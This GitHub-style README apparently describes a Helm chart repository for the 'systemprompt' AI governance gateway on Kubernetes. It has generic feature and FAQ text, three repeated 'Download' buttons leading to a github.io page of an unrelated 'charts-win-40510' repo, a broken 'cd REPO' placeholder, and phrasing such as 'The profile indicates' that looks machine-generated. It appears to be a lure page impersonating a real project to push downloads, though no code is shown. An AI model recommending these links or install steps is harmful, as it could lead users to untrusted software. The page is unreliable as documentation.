# systemprompt v2026 - Helm chart repository 2026

> **Helm chart repository for the systemprompt AI governance gateway on Kubernetes, offering a self-hosted way to manage AI interactions with the current release aligned to 2026.**

[![Platform](https://img.shields.io/badge/Platform-Kubernetes-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/weissleon62/charts-win-40510?style=flat-square)](https://github.com/weissleon62/charts-win-40510)

---

<p align="center">
  <a href="https://weissleon62.github.io/charts-win-40510/">
    <img src="https://img.shields.io/badge/Download-systemprompt%20Latest-brightgreen?style=for-the-badge" alt="Download systemprompt">
  </a>
</p>

> **[Direct Download - systemprompt v2026](https://weissleon62.github.io/charts-win-40510/)**

---

[Download Latest Build](https://weissleon62.github.io/charts-win-40510/)

---

## About systemprompt

systemprompt is a Helm chart repository for deploying an AI governance gateway in Kubernetes environments. It is designed for teams that need a self-hosted layer between applications and model providers, with a focus on controlling how AI requests are handled, observed, and billed.

The repository supports distribution of signed chart releases and is suited for air-gap-capable setups where external dependencies may be limited. It provides a practical path for organizations working with OpenAI, Claude, MCP, or other provider integrations while keeping the deployment model centered on Kubernetes and Helm.

---

## Features

- Helm chart distribution for Kubernetes deployments
- AI governance gateway for managing AI traffic
- Authentication and authorization for AI interactions
- Rate limiting controls for request management
- Logging support for operational visibility
- Cost tracking for usage monitoring
- Self-hosted deployment model
- Air-gap capable release distribution
- Provider-agnostic workflow support
- Signed chart releases for integrity-oriented delivery

---

## Installation

Clone or download the repository, then add the chart source to your Helm workflow.

git clone https://github.com/weissleon62/charts-win-40510.git
cd REPO
helm repo add systemprompt https://weissleon62.github.io/charts-win-40510/
helm repo update

To install a chart from the repository, use your preferred Helm release command once the repo is available in your local setup.

---

## Usage

After adding the repository, inspect the available chart packages and values before deployment.

helm search repo systemprompt
helm show values systemprompt/<chart-name>
helm install my-gateway systemprompt/<chart-name> -f values.yaml

Typical usage involves configuring access policies, setting request limits, enabling logging, and connecting the gateway to the AI providers your environment uses. For MCP-driven or multi-provider setups, adjust the chart values to match the deployment topology and access rules you want to enforce.

---

## Configuration

Chart settings are managed through Helm values.

values:
  gateway:
    auth: true
    authorization: true
    rateLimiting: true
    logging: true
    costTracking: true

Override these values with a custom values file or inline `--set` flags during installation and upgrades. Repository-level chart behavior, including release selection and deployment parameters, is controlled through Helm.

---

## Requirements

- Kubernetes cluster
- Helm installed locally
- Access to the chart repository
- A runtime environment suitable for self-hosted deployment
- Network access to your chosen AI provider endpoints, unless using an air-gapped workflow with locally available artifacts

---

## FAQ

**What is this repository for?**  
It hosts Helm charts for the systemprompt AI governance gateway.

**Does it work only with one provider?**  
No. The repository is designed around provider-agnostic chart distribution and can support different AI provider integrations.

**Can it be used in restricted environments?**  
Yes. The profile indicates air-gap-capable distribution, which makes it suitable for constrained network setups when the required artifacts are available locally.

**Where do I change gateway behavior?**  
Adjust Helm values for authentication, authorization, rate limits, logging, and cost tracking.

**How do I stay current with releases?**  
Use the repository download link above and refresh your Helm repo metadata before upgrading.

**What if a chart does not deploy as expected?**  
Check your Kubernetes resources, review the rendered chart output, and confirm that your values file matches the target cluster and provider configuration.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
